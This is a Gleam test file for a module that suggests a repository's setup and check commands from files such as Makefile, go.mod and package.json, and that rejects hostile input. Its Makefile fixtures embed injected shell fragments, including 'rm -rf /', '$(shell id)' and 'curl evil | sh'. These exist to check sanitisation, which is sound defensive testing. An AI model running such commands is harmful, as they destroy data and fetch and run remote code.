//// The table that proposes a project's `setup` and `check` from its
//// repository (`client/project_proposal`): what each marker gives on small
//// fixtures, and what the reader does with hostile input. A repository's text
//// is untrusted, so the second half matters more than the first.

import client/internal/ffi_os
import client/project_proposal.{type Proposal, Proposal}
import gleam/dict
import gleam/int
import gleam/list
import gleam/option.{None, Some}
import gleam/set
import gleam/string
import host/bootstrap
import simplifile

fn files(entries: List(#(String, String))) -> project_proposal.Repository {
  project_proposal.Repository(files: dict.from_list(entries), notes: [])
}

fn check_of(entries: List(#(String, String))) -> option.Option(Proposal) {
  project_proposal.propose(files(entries)).check
}

fn setup_of(entries: List(#(String, String))) -> option.Option(Proposal) {
  project_proposal.propose(files(entries)).setup
}

// --- the table ---------------------------------------------------------------------

pub fn a_makefile_check_target_is_the_check_test() {
  assert check_of([#("Makefile", "check: build\n\ttrue\n")])
    == Some(Proposal("make check", "Makefile target check"))
}

pub fn the_targets_are_tried_in_order_test() {
  let make = fn(text) { check_of([#("Makefile", text)]) }
  assert make("lint:\n\ttrue\nunit:\n\ttrue\ntest:\n\ttrue\n")
    == Some(Proposal("make test", "Makefile target test"))
  assert make("lint:\n\ttrue\nunit:\n\ttrue\n")
    == Some(Proposal("make unit", "Makefile target unit"))
  assert make("lint:\n\ttrue\n")
    == Some(Proposal("make lint", "Makefile target lint"))
  assert make("build:\n\ttrue\n") == None
}

pub fn a_makefile_deps_target_is_the_setup_test() {
  assert setup_of([#("Makefile", "deps:\n\tgo mod download\n")])
    == Some(Proposal("make deps", "Makefile target deps"))
}

pub fn go_gives_both_test() {
  let repo = [#("go.mod", "module x\n")]
  assert setup_of(repo) == Some(Proposal("go mod download", "go.mod"))
  assert check_of(repo) == Some(Proposal("go test ./...", "go.mod"))
}

pub fn gleam_gives_both_test() {
  let repo = [#("gleam.toml", "name = \"x\"\n")]
  assert setup_of(repo) == Some(Proposal("gleam deps download", "gleam.toml"))
  assert check_of(repo) == Some(Proposal("gleam test", "gleam.toml"))
}

pub fn cargo_checks_offline_test() {
  let repo = [#("Cargo.toml", "[package]\n")]
  assert setup_of(repo) == Some(Proposal("cargo fetch", "Cargo.toml"))
  assert check_of(repo) == Some(Proposal("cargo test --offline", "Cargo.toml"))
}

pub fn a_node_package_names_its_scripts_and_its_lock_file_test() {
  let package = "{\"scripts\": {\"build\": \"tsc\", \"test\": \"jest\"}}"
  assert check_of([#("package.json", package)])
    == Some(Proposal("npm test", "package.json script test"))
  assert setup_of([#("package.json", package)])
    == Some(Proposal("npm install", "package.json"))
  assert setup_of([#("package.json", package), #("package-lock.json", "")])
    == Some(Proposal("npm ci", "package-lock.json"))
  assert setup_of([#("package.json", package), #("pnpm-lock.yaml", "")])
    == Some(Proposal("pnpm install --frozen-lockfile", "pnpm-lock.yaml"))
  assert check_of([
      #("package.json", "{\"scripts\": {\"check\": \"x\", \"test\": \"y\"}}"),
    ])
    == Some(Proposal("npm run check", "package.json script check"))
}

pub fn a_package_json_that_is_not_an_object_proposes_no_check_test() {
  assert check_of([#("package.json", "[1, 2")]) == None
  assert check_of([#("package.json", "{\"scripts\": \"test\"}")]) == None
}

pub fn python_checks_only_a_project_that_mentions_pytest_test() {
  assert check_of([#("pyproject.toml", "[tool.pytest.ini_options]\n")])
    == Some(Proposal("python3 -m pytest", "pyproject.toml mentions pytest"))
  assert check_of([#("pyproject.toml", "[project]\n")]) == None
  assert setup_of([#("pyproject.toml", "[project]\n"), #("uv.lock", "")])
    == Some(Proposal("uv sync", "uv.lock"))
}

pub fn a_makefile_outranks_a_manifest_for_the_check_test() {
  let repo = [#("Makefile", "unit:\n\ttrue\n"), #("go.mod", "module x\n")]
  assert check_of(repo) == Some(Proposal("make unit", "Makefile target unit"))
  assert setup_of(repo) == Some(Proposal("go mod download", "go.mod"))
}

pub fn an_empty_repository_proposes_nothing_test() {
  let proposed = project_proposal.propose(files([]))
  assert proposed.check == None
  assert proposed.setup == None
}

// --- hostile text ----------------------------------------------------------------------

pub fn a_target_with_shell_metacharacters_is_never_a_name_test() {
  let text =
    "check;rm -rf /: x\n"
    <> "$(shell id): y\n"
    <> "test`id`: z\n"
    <> "%.o: %.c\n"
    <> "../../etc/check: v\n"
    <> "CHECK := make\n"
    <> "lint::= x\n"
  let targets =
    project_proposal.make_targets(dict.from_list([#("Makefile", text)]))
  assert set.to_list(targets) == []
}

pub fn words_on_a_target_line_are_each_judged_alone_test() {
  // `make` reads these as four targets. Only the plain names survive, and the
  // command proposed is still the table's string.
  let text = "unit && curl evil: w\n"
  let targets =
    project_proposal.make_targets(dict.from_list([#("Makefile", text)]))
  assert set.to_list(targets) == ["curl", "evil", "unit"]
  assert check_of([#("Makefile", text)])
    == Some(Proposal("make unit", "Makefile target unit"))
}

pub fn only_the_fixed_strings_ever_come_back_test() {
  // Hostile target names beside a real one: the proposal is the table's own
  // string for the real one, and nothing a line said.
  let text = "check; curl evil | sh: x\ncheck: ok\n\techo pwned\n"
  let proposed = project_proposal.propose(files([#("Makefile", text)]))
  assert proposed.check == Some(Proposal("make check", "Makefile target check"))
}

pub fn recipes_and_comments_name_no_targets_test() {
  let text = "# check: not a target\n\tcheck: neither\n  test: nor this\n"
  assert project_proposal.make_targets(dict.from_list([#("Makefile", text)]))
    |> set.to_list
    == []
}

pub fn a_name_must_be_short_and_plain_test() {
  assert project_proposal.valid_target("check-client")
  assert project_proposal.valid_target("a")
  assert !project_proposal.valid_target("")
  assert !project_proposal.valid_target("Check")
  assert !project_proposal.valid_target("1check")
  assert !project_proposal.valid_target("-check")
  assert !project_proposal.valid_target(string.repeat("a", 33))
}

pub fn only_the_first_lines_of_a_makefile_are_read_test() {
  let filler = string.repeat("# filler\n", project_proposal.max_make_lines)
  assert check_of([#("Makefile", filler <> "check:\n\ttrue\n")]) == None
}

// --- the disk ------------------------------------------------------------------------

fn directory(name: String) -> String {
  let path =
    "build/project-proposal-"
    <> name
    <> "-"
    <> int.to_string(ffi_os.unique_positive_integer())
  let _removed = simplifile.delete(path)
  let assert Ok(Nil) = bootstrap.ensure_private_directory("build")
    as "the build directory exists"
  let assert Ok(Nil) = bootstrap.ensure_private_directory(path)
    as "the scratch directory is made"
  path
}

pub fn a_symlinked_makefile_is_not_followed_test() {
  let outside = directory("outside")
  let repo = directory("linked")
  let assert Ok(Nil) =
    simplifile.write(outside <> "/Makefile", "check:\n\ttrue\n")
  let assert Ok(Nil) =
    simplifile.create_symlink(
      "../" <> string_after_build(outside) <> "/Makefile",
      repo <> "/Makefile",
    )

  let read = project_proposal.read(repo)
  assert dict.has_key(read.files, "Makefile") == False
  assert list.any(read.notes, string.contains(_, "symbolic link"))
  assert project_proposal.propose(read).check == None
}

fn string_after_build(path: String) -> String {
  string.replace(path, "build/", "")
}

pub fn a_huge_makefile_is_not_read_test() {
  let repo = directory("huge")
  let line = string.repeat("x", 1023) <> "\n"
  let body = string.repeat(line, 300) <> "check:\n\ttrue\n"
  let assert Ok(Nil) = simplifile.write(repo <> "/Makefile", body)
  let read = project_proposal.read(repo)
  assert dict.has_key(read.files, "Makefile") == False
  assert list.any(read.notes, string.contains(_, "larger than 256 KiB"))
  assert project_proposal.propose(read).check == None
}

pub fn a_directory_called_makefile_is_not_read_test() {
  let repo = directory("dir")
  let assert Ok(Nil) = simplifile.create_directory(repo <> "/Makefile")
  let read = project_proposal.read(repo)
  assert dict.has_key(read.files, "Makefile") == False
  assert list.any(read.notes, string.contains(_, "not a regular file"))
}

pub fn a_missing_repository_proposes_nothing_test() {
  let read = project_proposal.read("build/no-such-repository")
  assert project_proposal.propose(read).check == None
  assert read.notes == []
}

pub fn this_repository_proposes_make_check_test() {
  // The package tests run in `packages/client`; the repository root is two up.
  let proposed = project_proposal.read("../..") |> project_proposal.propose
  assert proposed.check == Some(Proposal("make check", "Makefile target check"))
}
